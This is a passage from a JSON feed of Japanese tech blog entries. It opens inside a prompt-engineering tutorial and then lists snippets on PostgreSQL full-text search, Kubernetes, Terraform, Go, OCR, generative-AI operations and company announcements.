\\"玉ねぎ 1個\\",    \\"にんじん 1本\\",    \\"じゃがいも 2個\\",    \\"牛肉 300g\\",    \\"カレールー 2箱\\",    \\"サラダ油 大さじ2\\",    \\"水 800ml\\",    \\"塩 少々\\",    \\"こしょう 少々\\"  ],  \\"手順\\": [    \\"玉ねぎ、にんじん、じゃがいもは食べやすい大きさに切る。\\",    \\"鍋にサラダ油を熱し、牛肉を炒め、色が変わったら玉ねぎを加えて炒める。\\",    \\"にんじん、じゃがいもを加えてさらに炒める。\\",    \\"水を加え、アクを取りながら煮込む。\\",    \\"野菜が柔らかくなったらカレールーを加えて溶かす。\\",    \\"塩こしょうで味を調え、5分ほど煮込む。\\"  ]}出力結果をJSON Formatterで確認JSON Formatter & ValidatorZero-shotプロンプティングZero-Shotプロンプティングとは、大規模言語モデル（LLM）に対して、事前に具体的な例を示すことなく、一度の指示でタスクを実行させるプロンプトエンジニアリング手法です。以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================紅白出場歌手の選考基準 NHK公開芸能Few-shotプロンプティングFew-Shotプロンプティングは、大規模言語モデル（LLM）に対して、タスクを実行するための具体的な例をいくつか示すことで、モデルの性能を向上させるプロンプトエンジニアリングの手法です。Zero-Shotプロンプティングとの違いZero-Shotプロンプティングが、一切の例を示さずにタスクを実行させるのに対し、Few-Shotプロンプティングでは、少数の例を提示することで、モデルがより効率的にタスクを学習できるようにします。以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================「紅白出場歌手の選考基準 NHK公開」===========================以下は例です「G20 バイデン氏不在で集合写真」：政治「岡田将生&高畑充希結婚 SNS反応」：芸能芸能Zero-shot Chain-of-ThoughtプロンプティングZero-shot Chain-of-Thought（CoT）プロンプティングは、大規模言語モデル（LLM）に対して、具体的な例を示すことなく、段階的な推論プロセスを踏ませるように指示するプロンプトエンジニアリングの手法です。回答だけ一言で出力してください。10 + 2 * 3 - 4 * 28ステップバイステップで考えてください。10 + 2 * 3 - 4 * 2## ステップバイステップで解いてみましょう！**与えられた式:** 10 + 2 * 3 - 4 * 2**解き方:**数学では、**掛け算と割り算**は、**足し算と引き算**よりも先に計算します。これを**優先順位**と言います。1.  **掛け算を計算する:**    * 2 * 3 = 6    * 4 * 2 = 8    式は、10 + 6 - 8 に変わります。2.  **残りの計算を行う:**    * 10 + 6 = 16    * 16 - 8 = 8**答え:** 8**まとめ:**与えられた式をステップバイステップで解くと、答えは**8**になります。**ポイント:*** **優先順位:** 掛け算と割り算は、足し算と引き算よりも先に計算します。* **計算順序:** 左から右へ計算していきます。**補足:**もし、計算の順番を変えたい場合は、**かっこ**を使います。例えば、(10 + 2) * 3 - 4 * 2 のようにかっこでくくると、最初に10と2を足してから3をかけることになります。**この説明で理解できましたか？** もし、まだ疑問な点があれば、遠慮なく質問してくださいね。Few-shot Chain-of-ThoughtプロンプティングFew-shot CoTプロンプティングは、大規模言語モデル（LLM）に、いくつかの例を示しながら、段階的な推論プロセスを踏ませることで、より複雑な問題を解かせる手法です。このグループの奇数を合計すると偶数になります。: 4、8、9、15、12、2、1。A: 奇数を全て加えると(9, 15, 1)25になります。答えはFalseです。このグループの奇数を合計すると偶数になります。: 17、10、19、4、8、12、24。A: 奇数を全て加えると(17, 19)36になります。答えはTrueです。このグループの奇数を合計すると偶数になります。: 16、11、14、4、8、13、24。A: 奇数を全て加えると(11, 13)24になります。答えはTrueです。このグループの奇数を合計すると偶数になります。: 17、9、10、12、13、4、2。A: 奇数を全て加えると(17, 9, 13)39になります。答えはFalseです。このグループの奇数を合計すると偶数になります。: 15、32、5、13、82、7、1。A:参考文献LangChainとLangGraphによるRAG・AIエージェント［実践］入門10倍速で成果が出る！ChatGPTスゴ技大全","isoDate":"2024-11-19T08:24:52.000Z","dateMiliSeconds":1732004692000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"PostgreSQLので全文検索拡張機能、pg_bigmを試す","link":"https://zenn.dev/nnaka2992/articles/use_pgbigm_on_cloudsql","contentSnippet":"アプリケーションを開発しているとアプリケーションログの分析や、JSONデータに対する分析など全文検索機能を求められることがたびたびあります。そういった場合はElasticsearchのように全文検索に特化したデータベースを導入することが多いです。しかし単純な文章の検索[^特にトランザクション用途]や小規模に利用される場合ばわざわざ専用のデータベースを管理作りたくないというケースが多いです。今回はPostgreSQLで利用可能な全文検索インデックスの拡張機能であるpg_bigmを紹介します。 検証環境の作成 CloudSQL 構成Cloud SQL EditionsE...","isoDate":"2024-11-16T11:12:07.000Z","dateMiliSeconds":1731755527000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"スリーシェイク、Think IT連載「Kubernetesスペシャリストが注目する関連ツール探求」が連載開始から1周年","link":"https://sreake.com/blog/kubernetes-2/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、インプレスグループが運営するエンジニア向け技術解説サイト「Think IT」にて連載中の「Kubernetesスペシャリストが注目する関連ツール探求」が、連載開始から1周年を迎えることをお知らせします。The post スリーシェイク、Think IT連載「Kubernetesスペシャリストが注目する関連ツール探求」が連載開始から1周年 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-14T01:00:00.000Z","dateMiliSeconds":1731546000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、「CloudNative Days Winter 2024」に出展・登壇","link":"https://sreake.com/blog/cloudnative-days-winter-2024/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2024年11⽉28日（木）・29日（金）に開催される「CloudNative Days Winter 2024」に出展および登壇することをお知らせします。The post スリーシェイク、「CloudNative Days Winter 2024」に出展・登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-12T01:19:07.000Z","dateMiliSeconds":1731374347000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes Sidecar 一問一答","link":"https://sreake.com/blog/kubernetes-native-sidecar/","contentSnippet":"はじめに Kubernetes 1.29からBeta機能となったSidecar Containerという機能を使う機会があったので、これについて一問一答形式で概要を共有してみようと思います。 小粒なTipsになりますがご […]The post Kubernetes Sidecar 一問一答 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-08T04:06:41.000Z","dateMiliSeconds":1731038801000,"authorName":"Sreake","authorId":"Sreake"},{"title":"データベースリライアビリティエンジニアリング輪読会","link":"https://sreake.com/blog/database-reliability-engineering-reading-circle/","contentSnippet":"はじめに こんにちは。株式会社スリーシェイク Sreake 事業部に所属している @Sugo Fumitaka です。Sreake 事業部は技術力が求められる領域で豊富な経験を持つ SRE の専門家が集まったチームです。 […]The post データベースリライアビリティエンジニアリング輪読会 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-08T04:00:52.000Z","dateMiliSeconds":1731038452000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREの前に","link":"https://speakerdeck.com/nwiizo/srenoqian-ni","contentSnippet":"2024年11月06日(水) 18:00～19:00の予定に遅刻してしまい、大変申し訳ございませんでした。お詫びとして、当初非公開予定であった資料を公開させていただきます。元々、公開する予定ではなかったので補足が足りない部分などあると思いますのでご容赦下さい。\\r\\rブログなどで補足情報出すかもなので気になればフォローしてください\\r- https://syu-m-5151.hatenablog.com/\\r- https://x.com/nwiizo\\r\\r\\rSREの前に - 運用の原理と方法論\\r公式URL: https://talent.supporterz.jp/events/2ed2656a-13ab-409c-a1d9-df8383be25fd/","isoDate":"2024-11-06T05:00:00.000Z","dateMiliSeconds":1730869200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイク、「SRE総合支援コンサルティングサービス」および「Datadog導入支援サービス」を AWS Marketplace で提供開始","link":"https://sreake.com/blog/datadog_aws-marketplace/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供する「SRE総合支援コンサルティングサービス」および「DataDog導入支援サービス」を AWS Marketplace で提供開始したことをお知らせします。The post スリーシェイク、「SRE総合支援コンサルティングサービス」および「Datadog導入支援サービス」を AWS Marketplace で提供開始 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-05T02:34:26.000Z","dateMiliSeconds":1730774066000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Generative AI Summit Tokyo ’24 Fallに参加しました","link":"https://sreake.com/blog/generative-ai-summit-tokyo-24-fall-2/","contentSnippet":"Sreake事業部インターン生の荒木です。先日Generative AI Summit Tokyo ’24 Fallに参加してまいりました！本イベントで得られた知見や、セッションの様子などを紹介します。 内容 […]The post Generative AI Summit Tokyo ’24 Fallに参加しました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-05T01:02:35.000Z","dateMiliSeconds":1730768555000,"authorName":"Sreake","authorId":"Sreake"},{"title":"FinOpsとは 〜クラウドネイティブ・SRE・CCoEの導入によるFinOpsの実践〜","link":"https://sreake.com/blog/finops%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 現在、さまざまな業界の多種多様なシステムにおいて、クラウドサービス\xad\xadが広く活用されています。 クラウドネイティブなシステムは、状況に応じて迅速に構築できること、柔軟にスケールできること等の利点がある一方 […]The post FinOpsとは 〜クラウドネイティブ・SRE・CCoEの導入によるFinOpsの実践〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:54.000Z","dateMiliSeconds":1730434134000,"authorName":"Sreake","authorId":"Sreake"},{"title":"クラウドネイティブとは 〜新時代を切り拓くためのCCoE・SRE導入と実践〜","link":"https://sreake.com/blog/%e3%82%af%e3%83%a9%e3%82%a6%e3%83%89%e3%83%8d%e3%82%a4%e3%83%86%e3%82%a3%e3%83%96%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに クラウドネイティブとは、クラウドの特性を最適に活用することを目指すアプローチや考え方のことです。 2006年にクラウドコンピューティングという言葉が誕生し、インターネット技術を利用してサービスを提供するコ […]The post クラウドネイティブとは 〜新時代を切り拓くためのCCoE・SRE導入と実践〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:34.000Z","dateMiliSeconds":1730434114000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Platform Engineeringとは  〜SRE導入で目指す開発者体験の革新〜","link":"https://sreake.com/blog/platform-engineering/","contentSnippet":"1. はじめに Platform Engineeringとは、開発ポータルなどの共通的なツールやサービスを高度に整備し、開発者体験(DevEx)とソフトウェアデリバリの生産性を向上させるための取り組みです。 これは、企業 […]The post Platform Engineeringとは  〜SRE導入で目指す開発者体験の革新〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:14.000Z","dateMiliSeconds":1730434094000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes Gateway API 入門","link":"https://zenn.dev/tayusa/articles/786e3c11e631fe","contentSnippet":"ちょうど1年前にGAとなったKubernetesのGateway APIを触る機会がなかったので、個人的に理解を深めるようと思います。https://kubernetes.io/blog/2023/10/31/gateway-api-ga/ Gateway API とは？L4とL7ルーティングを担う次世代のKubernetes Ingress、Load Balancing、Service Mesh APIsです。汎用的で表現力があり役割が分離できるように設計されています。役割指向Kubernetesのサービスネットワークの利用と設定を行う組織の役割を表現したAPIリソースに...","isoDate":"2024-10-31T02:57:25.000Z","dateMiliSeconds":1730343445000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"WebサイトやGitHubソースコードを処理 (ハンズオン)","link":"https://shu-kob.hateblo.jp/entry/2024/10/29/190456","contentSnippet":"#7 WebサイトやGitHubソースコードを処理 (ハンズオン)【オンライン】 - connpassgenai-users.connpass.com勉強会の資料です。Google Cloudでクレデンシャルを取得IAMと管理 > サービスアカウント↓こちらの記事を参考shu-kob.hateblo.jp環境変数にセット以下はMacで、.zprofileの場合export GOOGLE_APPLICATION_CREDENTIALS=\\"/path/PROJECT_ID-XXXXXXXXXX.json\\"source ~/.zprofileソースコードを取得github.comgit clone https://github.com/shu-kob/genai-web-github-loadercd genai-web-github-loadernpm iWebページを読んで要約loadWebPages.tsで、プロジェクトIDの書き換えconst project = \'PROJECT_ID\' // 書き換える実行npx tsx loadWebPages.ts https://www.raumen.co.jp/rapedia/study_history/ソースコードの読み込んで仕様書を作成loadGitHubでプロジェクトIDの書き換えconst project = \'PROJECT_ID\' // 書き換える実行npx tsx loadGitHub.ts https://github.com/shu-kob/genai-web-github-loader","isoDate":"2024-10-29T10:04:56.000Z","dateMiliSeconds":1730196296000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cilium Node IPAM LBによるロードバランシング","link":"https://sreake.com/blog/cilium-node-ipam-lb-load-balancing/","contentSnippet":"はじめに Sreake事業部でインターンをしている小林です。 本記事では、Cilium v1.16で追加されたCilium Node IPAM LBを検証しました。 Ciliumのロードバランシング方法 CiliumでL […]The post Cilium Node IPAM LBによるロードバランシング first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-28T05:08:45.000Z","dateMiliSeconds":1730092125000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、 「内製化支援推進 AWS パートナー」認定を取得","link":"https://sreake.com/blog/aws_partner/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 アマゾン ウェブ サービス（以下AWS）の AWS パートナープログラムにおける「内製化支援推進 AWS パートナー」に認定されたことをお知らせします。The post スリーシェイク、 「内製化支援推進 AWS パートナー」認定を取得 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-23T01:00:00.000Z","dateMiliSeconds":1729645200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"TerraformをRenovateで自動バージョンアップし、PR作成とMergeを自動化する","link":"https://zenn.dev/takehiro1111/articles/renovate_description","contentSnippet":"1.Renovateとは？ドキュメントでAutomated dependency updates. Multi-platform and multi-language.と記載されています。簡潔に言うと依存関係を自動で更新してくれるツールです。バージョンアップしてくれ、PR作成~Mergeまで自動で行ってくれます。!reference:https://docs.renovatebot.com/ 2.Dependabotとの比較 Renovateを採用するメリットRenovateだと異なる種類の依存関係でも、プロジェクト単位で1つのPRにまとめてくれてPRの...","isoDate":"2024-10-21T15:37:54.000Z","dateMiliSeconds":1729525074000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"KubernetesセキュリティDeep Dive","link":"https://sreake.com/blog/kubernetes-security-deep-dive/","contentSnippet":"自己紹介 高橋 楓 公立千歳科学技術大学理工学部2年の高橋楓です。普段は趣味や他社の長期インターンにてソフトウェア開発を行っており、インフラ基盤にはDockerを利用しています。しかし、KubernetesやGoogle […]The post KubernetesセキュリティDeep Dive first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-21T11:49:27.000Z","dateMiliSeconds":1729511367000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Goの公開、非公開フィールドについて","link":"https://zenn.dev/kamos/articles/1897b2a80b49c0","contentSnippet":"Goにはjavaでいうreadonlyのような、フィールドの変更を制御するような文法が存在しません。そのためGoではフィールドの公開、非公開が非常に重要な役割を持っています。Goで不変を表現したい場合、非公開なフィールドをつくり、それのゲッターを使って値を参照することが推奨されていますこの記事では興味本位ですが、フィールドの公開、非公開に注目して、どういった挙動をするのかまとめました。 検証 基本形それぞれの公開、非公開のプリミティブ型のフィールドを持っている場合は以下のようになります。pkg/item.gppackage pkgtype Item struct {...","isoDate":"2024-10-19T16:26:12.000Z","dateMiliSeconds":1729355172000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Goのポインタをどう扱うべきか","link":"https://zenn.dev/kamos/articles/d6e79fc82abfaf","contentSnippet":"Goのポインタについて、結局どうやって使い分けたらいいんだっけ?となることがあったので、挙動を整理したうえで使い所をまとめてみました。 ポインタの挙動 基本的な挙動Goのポインタは、変数の値が格納されているメモリアドレスを指します。そのためポインタをPrintすると、その変数のメモリアドレスが表示されます。main.gofunc main() {\\tv := \\"Hello, World!\\" // v is a string\\tp := &v              // p is a pointer to v\\tfmt.Println(v)\\tfmt.Prin...","isoDate":"2024-10-19T07:03:56.000Z","dateMiliSeconds":1729321436000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"生成AI入門","link":"https://speakerdeck.com/shukob/sheng-cheng-airu-men-340f58db-c1be-4877-92b9-7fbf1df3105e","contentSnippet":"https://genai-users.connpass.com/event/333130/\\rOSCオンラインで生成AIの基礎知識から、実際に活用できる技術まで、幅広く解説しました。\\r\\r生成AIとは何か、その仕組みを解説します。\\r生成AIモデルを比較し、具体的なユースケースを紹介します。\\rプロンプトエンジニアリング、RAG (Retrieval Augmented Generation)などの技術を説明します。\\rオープンソースライブラリLangChainについてご紹介します。\\r最後に生成AIが社会に与える影響や、今後の展望について考えます。","isoDate":"2024-10-19T04:00:00.000Z","dateMiliSeconds":1729310400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイク、「Developers X Summit 2024」に出展","link":"https://sreake.com/blog/developers-x-summit-2024/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供するSRE総合支援サービス「Sreake（スリーク）」は、2024年11月14日(木) に開催される「Developers X Summit 2024」にブース出展することをお知らせします。The post スリーシェイク、「Developers X Summit 2024」に出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-15T01:36:55.000Z","dateMiliSeconds":1728956215000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[Sidecar Containers] Pod Eviction 時のメッセージの改善","link":"https://zenn.dev/toversus/articles/d78254ad757094","contentSnippet":"はじめに先日 Kubernetes で報告されていたバグを修正する PR を送りました。その時に、今後 Kubernetes へのコントリビュートを考えている方の参考になればと思い、どう取り組んだか (Issue の読み解き方やローカル環境での再現、コードの修正、テストの追加などの一通りの流れ) を脳内ダンプして言語化してみました。それを社内向けに共有していたのですが、PR も無事にマージされたので、一部加筆修正して記事として公開します。Issue: [Sidecar Containers] Eviction message should account for the sid...","isoDate":"2024-10-14T07:39:56.000Z","dateMiliSeconds":1728891596000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Terraformを使ったECS停止時のカスタムSlack通知の実装","link":"https://zenn.dev/takehiro1111/articles/aws_event_ecs","contentSnippet":"1.記事を書いた理由業務でECSの異常停止時にSlackへ通知する仕組みを導入していますが、デフォルトの通知内容だと見辛く、エラーコードや停止理由の確認がAWSコンソールに慣れていない人には難しいという課題がありました 2.構成何らかの理由でECSが停止した際にEventBridgeで設定したルールでキャッチし、SNS,Chatbot経由でSlackへ通知する構成です。Lambdaでも実現出来るかと思いますが、今回は細かい要件を想定しておらず運用工数的にもChatbotで良い感じに通知してくれる構成にしています。クラスメソッドさんの記事を大変参考にさせていただきま...","isoDate":"2024-10-13T03:51:55.000Z","dateMiliSeconds":1728791515000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"スリーシェイク、「Biz/Zine Day 2024 Autumn」に出展","link":"https://sreake.com/blog/biz-zine-day-2024-autumn/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供するSRE総合支援サービス「Sreake（スリーク）」は、2024年10月30日(水) に開催される「Biz/Zine Day 2024 Autumn」にブース出展することをお知らせします。The post スリーシェイク、「Biz/Zine Day 2024 Autumn」に出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-10T01:18:48.000Z","dateMiliSeconds":1728523128000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[Terraform/AWS] ステートファイルの切り替えコマンド","link":"https://zenn.dev/takehiro1111/articles/tfstate_switch","contentSnippet":"backend設定の切り替えbackendを別設定へ切り替える際は、コードの記述を変更して以下コマンドを実行します。例えば、Terraformで構築し始めの際にストレージを用意出来ていない場合に一時的にlocalに設定した後にS3に変更するケースで用います。切り替え前のファイルが不要な場合は、コマンド実行後に削除します。 切り替え前のファイルから切り替え後のファイルに既存内容をコピーする必要がある場合terraform init -migrate-state 切り替え前のファイルから切り替え後のファイルに既存内容をコピーしない場合terraform init ...","isoDate":"2024-09-16T13:05:31.000Z","dateMiliSeconds":1726491931000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Terraform/AWS] ステートファイルの管理方法(local,s3,terragrunt等)","link":"https://zenn.dev/takehiro1111/articles/terraform_tfstate","contentSnippet":"本記事を読み終わった時のゴールステートファイルの概念、必要性を認識出来る事。状況に応じて適切なbackendの設定が出来る事。\xa0 目次ステートファイルの概要ステートファイルの構文,ロック機能の記述backend設定のパターン別解説backend設定の切り替え(例:local⇔S3)\xa0 本編 1. ステートファイルの説明 ステートファイルとは？Terraform管理下で実際に構築されているリソースのマッピング情報がJSONフォーマットで記述されるファイル。Terraformが内部的に使用するプライベートなAPIとして機能する。このファイ...","isoDate":"2024-09-16T13:05:30.000Z","dateMiliSeconds":1726491930000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Terraform/AWS]インストール,初期設定","link":"https://zenn.dev/takehiro1111/articles/terraform_install","contentSnippet":"本記事を読み終わった時のゴールLinux/Macの何れかの環境にTerraformをインストール出来る事。Terraformの主要な管理コマンドをざっくり把握した状態。AWS CLI,HCLでAWS APIを呼び出せるよう適切に認証情報を設定できる事。\xa0 目次Terraformの概念実際にTerraformをインストールする(Mac/Linux)Terraformの主要な管理コマンドCLI,HCLでAWS APIを呼び出せるよう認証情報の設定\xa0 本編 1. Terraformの概念 Terraformとは？米企業の Hashicorp 社...","isoDate":"2024-09-16T13:05:29.000Z","dateMiliSeconds":1726491929000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Google Cloud で生成 AI アプリを評価するアーキテクチャパターン","link":"https://zenn.dev/kimitsu/articles/google-cloud-gen-ai-eval-arch","contentSnippet":"用語について オンライン評価とオフライン評価評価はそのタイミング、やり方によってオンライン評価とオフライン評価に分けられます。オンライン評価とは、システムやモデルが実際の運用中にリアルタイムで評価される手法です。オフライン評価は、事前に用意されたデータセットを使用し、システムやモデルの性能をテスト環境で評価する方法です。生成 AI アプリケーションの場合には、オンライン評価は実際のユーザが生成 AI を利用した際の入出力に対して評価を行います。特徴としては、模範解答を用意することができないため生成 AI による評価（LLM as a Judge）をします。オフライン評...","isoDate":"2024-09-15T13:36:11.000Z","dateMiliSeconds":1726407371000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google Cloud でのプロンプト管理は Vertex AI Studio を使おう","link":"https://zenn.dev/kimitsu/articles/google-cloud-temporary-prompt-version-management","contentSnippet":"背景Google Cloud では Google Cloud Next \'24 にて Vertex AI Studio の Prompt Version Management とその SDK Support が発表されました。[1]将来的には Google Cloud におけるプロンプト管理はこの機能を使うことになると思われますが、本記事執筆時点では SDK Support は公開されていません。そのため現時点で Google Cloud でプロンプトを管理するのにどのサービスを使うべきか検討した結果を共有します。検討にあたっては以下の観点を考慮しました。バージョン管理機...","isoDate":"2024-09-14T15:52:30.000Z","dateMiliSeconds":1726329150000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"AIを用いたOCR","link":"https://shu-kob.hateblo.jp/entry/2024/09/11/223456","contentSnippet":"OCRとは、Optical Character Recognitionの略で、日本語では光学文字認識といいます。OCRとは何か？OCRは、スキャンした書類や画像に含まれる文字を、コンピュータが読み取り、テキストデータに変換する技術です。つまり、紙に書かれた文字をデジタルの文字に変えて、パソコンで編集したり、検索したりできるようにするものです。OCRの仕組み画像の取り込み: スキャナーやデジタルカメラで、文字が書かれた紙の画像を撮影します。画像の前処理: 画像のノイズ除去や歪みの修正など、文字認識を円滑に行うための処理を行います。文字の切り出し: 画像から文字を一つずつ切り出します。文字の認識: 切り出した文字を、事前に登録された文字のパターンと照合し、どの文字か判定します。テキストデータへの変換: 認識された文字を、テキストデータに変換します。OCRの活用例書類のデジタル化: 紙の書類をスキャンしてテキストデータに変換することで、電子化し、保管や検索を効率化できます。データ入力の自動化: 請求書や領収書などの文字情報を自動的に読み込むことで、データ入力の手間を大幅に削減できます。検索の効率化: テキストデータに変換された文書は、キーワード検索が可能になり、必要な情報に素早くアクセスできます。翻訳: OCRでテキストデータに変換した後に、翻訳ソフトウェアを使って他の言語に翻訳することができます。OCRのメリット作業の効率化: 手作業でのデータ入力に比べて、大幅に作業時間を短縮できます。正確性の向上: 人による入力ミスを減らすことができ、データの正確性を高めます。コスト削減: 人件費の削減につながります。ペーパーレス化: 紙の書類を電子化することで、保管スペースを削減し、環境にも優しいです。OCRの種類OCRには、大きく分けて以下の2種類があります。OCRエンジン: ソフトウェア開発者が、OCR機能を自社のアプリケーションに組み込むために利用するソフトウェアです。OCRサービス: クラウド上で提供されるOCR機能で、APIなどを利用して簡単にOCR機能を導入できます。OCRの選び方OCRを選ぶ際には、以下の点に注意しましょう。認識精度: どの程度の精度で文字を認識できるか。対応言語: どの言語に対応しているか。対応フォント: どのフォントに対応しているか。対応ファイル形式: どのファイル形式に対応しているか。価格: 有料か無料か、料金体系はどうか。AIを用いたOCRcloud.google.comGoogle CloudなどパブリッククラウドでOCR機能が提供されています。Geminiで使用することもできます。OCRの活用の幅が広がり、工数削減に役立ちそうですね。まとめOCRは、紙の文書をデジタル化し、業務効率化に貢献する便利な技術です。様々な分野で活用されており、今後もその重要性はますます高まっていくでしょう。","isoDate":"2024-09-11T13:34:56.000Z","dateMiliSeconds":1726061696000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Apple Intelligence触ってみたい","link":"https://shu-kob.hateblo.jp/entry/2024/09/10/235654","contentSnippet":"k-tai.watch.impress.co.jpiPhone16で、Apple Intelligenceという名の生成AIが搭載されるようですね。Xなどではいまいち、盛り上がりに欠けているものの、生成AIを生業にするものとしては、触ってみたいです。Google PixelがGeminiを搭載したAIスマホとして売り出されていますが、iPhone・Apple Watch・Macユーザとしては、引き続きiPhoneですかね。Geminiは好きなので、Google Pixel欲しい気もしますがww","isoDate":"2024-09-10T14:56:54.000Z","dateMiliSeconds":1725980214000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"生成 AI アプリで収集するべきテレメトリは何か","link":"https://zenn.dev/kimitsu/articles/gen-ai-telemetry","contentSnippet":"2024 年現在、生成 AI のアプリケーションへの応用が進んでおり^{[要出典]}、運用のためのツールやサービスが登場しています。生成 AI 専用のサービスとしては LangSmith と Langfuse が有名で、それぞれモデルへの入出力やトレースなどを取ることができます。監視 SaaS である Datadog でも LLM Observability の機能がリリースされています。また先月末には Google Cloud のブログにて GenOps についての記事が投稿され、その中でロギングや評価についての記載もありました。https://cloud.google.com...","isoDate":"2024-09-08T03:11:06.000Z","dateMiliSeconds":1725765066000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google の提唱する GenOps って何？","link":"https://zenn.dev/kimitsu/articles/what-is-genops","contentSnippet":"2024 年 8 月 31 日に Google Cloud のブログにて「GenOps: learning from the world of microservices and traditional DevOps」という記事が投稿されました。https://cloud.google.com/blog/products/devops-sre/genops-learnings-from-microservices-and-traditional-devopsこれまでも LangSmith や Langfuse といった LLMOps ツールや Datadog の LLM Observ...","isoDate":"2024-09-07T07:59:59.000Z","dateMiliSeconds":1725695999000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"生成AIにおけるベクトルインデックス","link":"https://shu-kob.hateblo.jp/entry/2024/09/06/234850","contentSnippet":"生成AIにおけるベクトルインデックス：詳細解説ベクトルインデックスとは？ベクトルインデックスは、生成AIにおいて、テキスト、画像、音声などの非構造化データを、数値のベクトルに変換し、そのベクトル間の類似度に基づいて検索や推薦を行うための技術です。なぜベクトルに変換するのか？意味の理解: 単語の並びだけでなく、単語間の関係性や文脈を数値として表現することで、コンピュータがより深くテキストの意味を理解できるようになります。高速な検索: 高次元空間上のベクトル間の距離を計算することで、従来のキーワード検索よりも高速かつ正確に類似したデータを検索できます。多様なデータの統合: テキストだけでなく、画像や音声などもベクトルに変換することで、異なる種類のデータを統一的に扱うことができます。ベクトルインデックスの仕組みベクトル化: テキストや画像などを、ニューラルネットワークなどのモデルを用いて数値のベクトルに変換します。インデックス作成: 変換されたベクトルを、効率的に検索できるようにインデックスを作成します。ベクトル検索: ユーザーのクエリをベクトル化し、作成されたインデックスから最も類似したベクトルを検索します。ベクトルインデックスの活用事例検索エンジン: キーワードだけでなく、文章の意味に基づいたより精度の高い検索を実現します。推薦システム: ユーザーの興味関心に基づいた商品やコンテンツを推薦します。チャットボット: ユーザーの質問に対して、より自然な回答を生成します。画像検索: 画像の内容に基づいた検索や、類似画像の検索を行います。ベクトルインデックスのメリット高精度な検索: キーワードマッチングだけでなく、意味に基づいた検索が可能になります。柔軟なデータ処理: テキストだけでなく、画像や音声など、様々な種類のデータを扱えます。スケーラビリティ: 大量のデータを効率的に処理できます。ベクトルインデックスの課題次元数の呪い: 高次元空間での計算コストが大きくなることがあります。モデルの選択: どのモデルを用いてベクトルに変換するかが、性能に大きく影響します。解釈の難しさ: ベクトル表現が抽象的であり、人間が直感的に理解することが難しい場合があります。今後の展望ベクトルインデックスは、生成AIのさらなる発展に不可欠な技術です。より大規模なデータセットへの対応、より高精度なベクトル化モデルの開発、そして、ベクトル表現の解釈に関する研究が進められていくことが期待されます。具体的な活用事例eコマース: ユーザーの過去の購入履歴や検索履歴に基づいた商品推薦カスタマーサポート: チャットボットによるFAQ検索や、ユーザーの問い合わせに対する自動応答医療: 医療論文の検索や、診断支援金融: 